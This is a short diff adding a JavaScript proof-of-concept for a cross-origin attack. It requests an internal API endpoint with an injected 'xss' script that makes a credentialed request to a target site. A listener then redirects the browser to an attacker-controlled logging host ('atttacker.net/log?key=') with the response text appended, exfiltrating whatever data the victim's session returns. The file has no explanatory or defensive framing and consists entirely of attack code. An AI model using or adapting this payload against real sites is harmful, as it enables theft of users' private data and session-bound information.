@@ -1,0 +1,9 @@
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://api.internal.example.com/endpoint?xss=function cors(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.readyState==4&&this.status==200){document.getElementById("demo").innerHTML=alert(this.responseText);}};xhttp.open("GET","https://target.com",true);xhttp.withCredentials=true;xhttp.send();}
+',true);
+req.send();
+
+function reqListener() {
+    location='//atttacker.net/log?key='+this.responseText;
+};
